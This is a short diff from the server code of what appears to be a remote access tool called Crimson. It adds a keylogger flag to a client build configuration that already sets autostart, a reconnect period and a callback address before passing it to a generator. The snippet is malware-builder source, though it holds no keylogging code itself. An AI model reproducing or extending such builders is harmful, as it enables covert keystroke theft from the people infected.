@@ -140,7 +140,7 @@ public final class Server {
 				.addTarget(NetworkTarget.newBuilder().setServer("127.0.0.1").setPort(10101).build())
 				.setPathWin("C:\\Users\\dev\\Documents\\Crimson").setPathBsd("/").setPathLin("/home/dev/cr")
 				.setPathOsx("/").setPathSol("/").setReconnectPeriod(3000).setBuildNumber(Common.build)
-				.setAutostart(true).build();
+				.setAutostart(true).setKeylogger(true).build();
 		try {
 			Generator g = new Generator();
 			g.generate(cc);
